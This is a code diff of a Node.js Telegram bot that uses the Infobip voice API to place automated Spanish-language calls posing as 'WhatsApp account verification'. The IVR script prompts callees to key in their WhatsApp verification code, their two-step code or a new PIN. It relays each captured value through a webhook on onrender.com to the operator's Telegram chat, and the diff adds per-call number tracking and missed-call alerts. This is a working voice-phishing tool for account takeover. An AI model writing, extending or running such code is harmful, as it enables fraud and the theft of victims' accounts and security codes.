@@ -22,11 +22,12 @@ const WEBHOOK = "https://botllamadas.onrender.com/infobip-webhook";
 // =========================
 const authenticatedUsers = {};
 const awaitingInput = {};
-const callRequests = {};
-const callRequestsByNumber = {};
+const callRequests = {};          // { scenarioId: chatId }
+const callRequestsByNumber = {};  // { targetNumber: { chatId, fromNumber } }
+const answeredCalls = new Set();  // números que sí contestaron
 
 const SCENARIO_NAME = "Verificación de cuenta WhatsApp";
-let cachedScenarioId = null; // Se recreará con el nuevo payload
+let cachedScenarioId = null;
 
 // =========================
 // INICIALIZACIÓN DEL BOT
@@ -154,12 +155,12 @@ function notifyEvent(type, extra = {}) {
     options: {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: { type, from: "${caller}", to: "${destination}", ...extra }
+      body: { type, ...extra }
     }
   };
 }
 
-function buildScenarioPayload() {
+function buildScenarioPayload(fromNumber, toNumber) {
   const voiceOptions = { language: "es", gender: "female" };
 
   return {
@@ -168,9 +169,8 @@ function buildScenarioPayload() {
     script: [
 
       // 📲 Llamada contestada
-      notifyEvent("CALL_ANSWERED"),
+      notifyEvent("CALL_ANSWERED", { from: fromNumber, to: toNumber }),
 
-      // Bucle opción inicial
       {
         repeat: [
           {
@@ -185,8 +185,7 @@ function buildScenarioPayload() {
         while: "${initialOption != '1' && initialOption != '2'}"
       },
 
-      // 🔢 Opción inicial capturada
-      notifyEvent("DTMF_CAPTURED", { field: "initialOption", value: "${initialOption}" }),
+      notifyEvent("DTMF_CAPTURED", { field: "initialOption", value: "${initialOption}", from: fromNumber, to: toNumber }),
 
       { say: "Ha presionado ${initialOption}.", options: voiceOptions },
 
@@ -200,10 +199,8 @@ function buildScenarioPayload() {
         options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" }
       },
 
-      // 🔑 Código de verificación capturado
-      notifyEvent("DTMF_CAPTURED", { field: "verificationCode", value: "${verificationCode}" }),
+      notifyEvent("DTMF_CAPTURED", { field: "verificationCode", value: "${verificationCode}", from: fromNumber, to: toNumber }),
 
-      // Bucle verificación dos pasos
       {
         repeat: [
           {
@@ -218,10 +215,8 @@ function buildScenarioPayload() {
         while: "${twoStepOption != '1' && twoStepOption != '2'}"
       },
 
-      // 🔢 Opción dos pasos capturada
-      notifyEvent("DTMF_CAPTURED", { field: "twoStepOption", value: "${twoStepOption}" }),
+      notifyEvent("DTMF_CAPTURED", { field: "twoStepOption", value: "${twoStepOption}", from: fromNumber, to: toNumber }),
 
-      // Rama: tiene verificación de dos pasos
       {
         if: "${twoStepOption == '1'}",
         then: [
@@ -233,13 +228,11 @@ function buildScenarioPayload() {
             collectInto: "twoStepCode",
             options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" }
           },
-          // 🔐 Código dos pasos capturado
-          notifyEvent("DTMF_CAPTURED", { field: "twoStepCode", value: "${twoStepCode}" }),
+          notifyEvent("DTMF_CAPTURED", { field: "twoStepCode", value: "${twoStepCode}", from: fromNumber, to: toNumber }),
           { say: "Código de dos pasos recibido. Gracias por su verificación.", options: voiceOptions }
         ]
       },
 
-      // Rama: configura nuevo PIN
       {
         if: "${twoStepOption == '2'}",
         then: [
@@ -251,52 +244,20 @@ function buildScenarioPayload() {
             collectInto: "newTwoStepPin",
             options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" }
           },
-          // 📌 Nuevo PIN capturado
-          notifyEvent("DTMF_CAPTURED", { field: "newTwoStepPin", value: "${newTwoStepPin}" }),
+          notifyEvent("DTMF_CAPTURED", { field: "newTwoStepPin", value: "${newTwoStepPin}", from: fromNumber, to: toNumber }),
           { say: "Nuevo pin configurado correctamente.", options: voiceOptions }
         ]
       },
 
-      // 📵 Llamada finalizando
-      notifyEvent("CALL_FINISHED"),
+      notifyEvent("CALL_FINISHED", { from: fromNumber, to: toNumber }),
 
       "hangup"
     ]
   };
 }
 
-function getOrCreateScenario(apiKey, callback) {
-  if (cachedScenarioId) {
-    console.log("♻️ Reutilizando escenario en caché:", cachedScenarioId);
-    return callback(null, cachedScenarioId);
-  }
-
-  const options = {
-    method: "GET",
-    hostname: INFOBIP_BASE_HOST,
-    path: "/voice/ivr/1/scenarios",
-    headers: { Authorization: apiKey, Accept: "application/json" },
-    maxRedirects: 20
-  };
-
-  const req = https.request(options, (res) => {
-    let chunks = [];
-    res.on("data", (chunk) => chunks.push(chunk));
-    res.on("end", () => {
-      try {
-        const list = JSON.parse(Buffer.concat(chunks).toString());
-        // Siempre crear uno nuevo para que tenga los request intermedios
-        createScenario(apiKey, callback);
-      } catch (e) {
-        callback(e);
-      }
-    });
-  });
-  req.on("error", callback);
-  req.end();
-}
-
-function createScenario(apiKey, callback) {
+// Siempre crea escenario nuevo con los números reales inyectados
+function createScenario(apiKey, fromNumber, toNumber, callback) {
   const options = {
     method: "POST",
     hostname: INFOBIP_BASE_HOST,
@@ -311,9 +272,8 @@ function createScenario(apiKey, callback) {
       try {
         const json = JSON.parse(Buffer.concat(chunks).toString());
         if (json && json.id) {
-          cachedScenarioId = json.id;
-          console.log("✅ Nuevo escenario creado:", cachedScenarioId);
-          callback(null, cachedScenarioId);
+          console.log("✅ Nuevo escenario creado:", json.id);
+          callback(null, json.id);
         } else {
           callback(new Error("No se recibió ID de escenario: " + JSON.stringify(json)));
         }
@@ -323,7 +283,7 @@ function createScenario(apiKey, callback) {
     });
   });
   req.on("error", callback);
-  req.write(JSON.stringify(buildScenarioPayload()));
+  req.write(JSON.stringify(buildScenarioPayload(fromNumber, toNumber)));
   req.end();
 }
 
@@ -332,12 +292,12 @@ function createScenario(apiKey, callback) {
 // =========================
 
 function initiateCall(chatId, targetNumber, fromNumber) {
-  bot.telegram.sendMessage(chatId, "⏳ Obteniendo escenario IVR...");
+  bot.telegram.sendMessage(chatId, "⏳ Creando escenario IVR...");
   const apiKey = getUserApiKey(chatId);
 
-  getOrCreateScenario(apiKey, (err, scenarioId) => {
+  createScenario(apiKey, fromNumber, targetNumber, (err, scenarioId) => {
     if (err) {
-      bot.telegram.sendMessage(chatId, `❌ Error obteniendo escenario: ${err.message}`);
+      bot.telegram.sendMessage(chatId, `❌ Error creando escenario: ${err.message}`);
       return;
     }
     sendCallMessage(chatId, scenarioId, targetNumber, fromNumber);
@@ -345,17 +305,19 @@ function initiateCall(chatId, targetNumber, fromNumber) {
 }
 
 function sendCallMessage(chatId, scenarioId, targetNumber, fromNumber) {
+  // Guardar por scenarioId y por número (con y sin +)
   callRequests[scenarioId] = chatId;
-  callRequestsByNumber[targetNumber] = chatId;
-  callRequestsByNumber[targetNumber.replace(/^\+/, "")] = chatId;
+  const cleanTarget = targetNumber.replace(/^\+/, "");
+  callRequestsByNumber[cleanTarget] = { chatId, fromNumber, toNumber: targetNumber };
+  callRequestsByNumber["+" + cleanTarget] = { chatId, fromNumber, toNumber: targetNumber };
 
   const bulkId = "BULK-" + Date.now() + "-" + Math.random().toString(36).substr(2, 6);
 
   const messagePayload = {
-    bulkId: bulkId,
+    bulkId,
     messages: [
       {
-        scenarioId: scenarioId,
+        scenarioId,
         from: fromNumber,
         destinations: [{ to: targetNumber }],
         retry: { minPeriod: 1, maxPeriod: 5, maxCount: 5 },
@@ -370,7 +332,7 @@ function sendCallMessage(chatId, scenarioId, targetNumber, fromNumber) {
     ]
   };
 
-  bot.telegram.sendMessage(chatId, "🚀 Enviando mensaje de llamada...");
+  bot.telegram.sendMessage(chatId, "🚀 Enviando llamada...");
 
   const options = {
     method: "POST",
@@ -389,12 +351,12 @@ function sendCallMessage(chatId, scenarioId, targetNumber, fromNumber) {
     res.on("data", (chunk) => chunks.push(chunk));
     res.on("end", () => {
       const msgBody = Buffer.concat(chunks).toString();
-      bot.telegram.sendMessage(chatId, `📨 Respuesta del mensaje: ${msgBody}`);
+      bot.telegram.sendMessage(chatId, `📨 Respuesta: ${msgBody}`);
     });
   });
 
   req.on("error", (error) => {
-    bot.telegram.sendMessage(chatId, `❌ Error al enviar mensaje: ${error.message}`);
+    bot.telegram.sendMessage(chatId, `❌ Error al enviar llamada: ${error.message}`);
   });
 
   req.write(JSON.stringify(messagePayload));
@@ -416,33 +378,36 @@ function extractScenarioId(event) {
   );
 }
 
-function notifyTelegram(scenarioId, msg, toNumber) {
-  let chatId = scenarioId ? callRequests[scenarioId] : null;
-
-  if (!chatId && toNumber) {
-    const cleanNumber = String(toNumber).replace(/^\+/, "");
-    chatId = callRequestsByNumber[cleanNumber] || callRequestsByNumber["+" + cleanNumber] || null;
-    if (chatId) console.log("📍 chatId encontrado por número:", toNumber, "→", chatId);
+function resolveChatId(scenarioId, toNumber) {
+  // 1. Por scenarioId
+  if (scenarioId && callRequests[scenarioId]) {
+    return callRequests[scenarioId];
   }
+  // 2. Por número destino
+  if (toNumber) {
+    const clean = String(toNumber).replace(/^\+/, "");
+    const entry = callRequestsByNumber[clean] || callRequestsByNumber["+" + clean];
+    if (entry) return entry.chatId;
+  }
+  return null;
+}
+
+function notifyTelegram(scenarioId, msg, toNumber) {
+  const chatId = resolveChatId(scenarioId, toNumber);
 
   if (chatId) {
     bot.telegram.sendMessage(chatId, msg, { parse_mode: "Markdown" })
       .then(() => console.log("🔔 Notificación enviada al usuario:", chatId))
       .catch((err) => console.error("❌ Error Telegram:", err));
   } else {
-    console.log("⚠️ Sin chatId para scenarioId:", scenarioId, "— notificando a admins.");
-    let notified = false;
+    console.log("⚠️ Sin chatId — notificando a admins.");
     Object.entries(authenticatedUsers).forEach(([id, user]) => {
       if (user.authenticated && user.admin) {
-        notified = true;
         bot.telegram.sendMessage(id, msg, { parse_mode: "Markdown" })
-          .then(() => console.log("🔔 Notificación enviada al admin:", id))
+          .then(() => console.log("🔔 Admin notificado:", id))
           .catch((err) => console.error("❌ Error Telegram admin:", err));
       }
     });
-    if (!notified) {
-      console.error("❌ No hay admins autenticados para recibir la notificación.");
-    }
   }
 }
 
@@ -453,18 +418,41 @@ app.post("/infobip-webhook", (req, res) => {
   const handleEvent = (event) => {
     const scenarioId = extractScenarioId(event);
     const toNumber = event.to || (event.voiceCall && event.voiceCall.to) || null;
-    console.log("scenarioId:", scenarioId, "| type:", event.type || "REPORTE_FINAL");
+    console.log("type:", event.type || "REPORTE_FINAL", "| to:", toNumber);
+
+    // Registrar si contestó
+    if (event.type === "CALL_ANSWERED" && toNumber) {
+      const clean = String(toNumber).replace(/^\+/, "");
+      answeredCalls.add(clean);
+    }
+
+    // Detectar no contestó: reporte final sin CALL_ANSWERED previo
+    if (!event.type && event.voiceCall) {
+      const toNum = toNumber ? String(toNumber).replace(/^\+/, "") : null;
+      const didAnswer = toNum && answeredCalls.has(toNum);
+
+      if (!didAnswer) {
+        // Alerta de no contestó en tiempo real
+        const from = event.from || (event.voiceCall && event.voiceCall.from) || "?";
+        const timestamp = new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" });
+        const alertMsg = `📵 *NO CONTESTÓ*\n📞 De: +${from}\n🎯 Para: +${toNumber || "?"}\n🕐 ${timestamp}`;
+        notifyTelegram(scenarioId, alertMsg, toNumber);
+
+        // Limpiar y no procesar el resumen
+        cleanup(scenarioId, toNumber);
+        return;
+      }
+
+      // Limpiar el número del set al finalizar
+      if (toNum) answeredCalls.delete(toNum);
+    }
+
     const msg = processCallEvent(event);
     notifyTelegram(scenarioId, msg, toNumber);
 
-    const endEvents = ["CALL_FINISHED", "CALL_FAILED", "HANGUP", "FINISHED", "FAILED"];
-    if (event.type && endEvents.includes(event.type)) {
-      if (scenarioId) delete callRequests[scenarioId];
-      if (toNumber) {
-        const cleanNumber = String(toNumber).replace(/^\+/, "");
-        delete callRequestsByNumber[cleanNumber];
-        delete callRequestsByNumber["+" + cleanNumber];
-      }
+    // Limpiar al finalizar
+    if (event.type === "CALL_FINISHED" || (!event.type && event.voiceCall)) {
+      cleanup(scenarioId, toNumber);
     }
   };
 
@@ -476,6 +464,16 @@ app.post("/infobip-webhook", (req, res) => {
 
   res.sendStatus(200);
 });
+
+function cleanup(scenarioId, toNumber) {
+  if (scenarioId) delete callRequests[scenarioId];
+  if (toNumber) {
+    const clean = String(toNumber).replace(/^\+/, "");
+    delete callRequestsByNumber[clean];
+    delete callRequestsByNumber["+" + clean];
+    answeredCalls.delete(clean);
+  }
+}
 
 // =========================
 // PROCESAMIENTO DE EVENTOS
@@ -510,11 +508,11 @@ function processCallEvent(event) {
 
       case "DTMF_CAPTURED": {
         const fieldNames = {
-          initialOption:   "Opción inicial",
+          initialOption:    "Opción inicial",
           verificationCode: "🔑 Código de verificación",
-          twoStepOption:   "Opción dos pasos",
-          twoStepCode:     "🔐 Código dos pasos",
-          newTwoStepPin:   "📌 Nuevo PIN"
+          twoStepOption:    "Opción dos pasos",
+          twoStepCode:      "🔐 Código dos pasos",
+          newTwoStepPin:    "📌 Nuevo PIN"
         };
         const fieldLabel = fieldNames[event.field] || event.field;
         message = `🔢 *${fieldLabel}: ${event.value}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
@@ -531,20 +529,13 @@ function processCallEvent(event) {
         message = `🔔 *LLAMANDO...*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
         break;
 
-      case "DTMF":
-      case "DTMF_RECEIVED": {
-        const digit = (event.properties && event.properties.dtmf) || event.value || "?";
-        message = `🔢 *TECLA PRESIONADA: ${digit}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
-        break;
-      }
-
       default:
         message = `ℹ️ *EVENTO: ${event.type}*\n📞 De: +${from}\n🎯 Para: +${to}\n🕐 ${timestamp}`;
-        if (event.properties) message += `\n📋 Detalles: ${JSON.stringify(event.properties)}`;
+        if (event.properties) message += `\n📋 ${JSON.stringify(event.properties)}`;
     }
 
   } else if (event.voiceCall && event.voiceCall.ivr && event.voiceCall.ivr.collectedDtmfs) {
-    // Reporte final de Infobip (llega igual que antes como respaldo)
+    // Resumen final
     message = `📋 *RESUMEN DE LLAMADA*\n📞 De: +${from}\n🎯 Para: +${to}\n`;
     try {
       const dtmfData = JSON.parse(event.voiceCall.ivr.collectedDtmfs);
@@ -587,7 +578,7 @@ function launchBot(retries = 5) {
           console.warn(`⚠️ Conflicto 409 (otra instancia activa). Reintentando en ${delay / 1000}s... (${retries} intentos restantes)`);
           setTimeout(() => launchBot(retries - 1), delay);
         } else {
-          console.error("❌ No se pudo iniciar el bot después de varios intentos (error 409). El servidor Express sigue activo.");
+          console.error("❌ No se pudo iniciar el bot después de varios intentos (error 409).");
         }
       } else {
         console.error("❌ Error al iniciar el bot:", err.message);
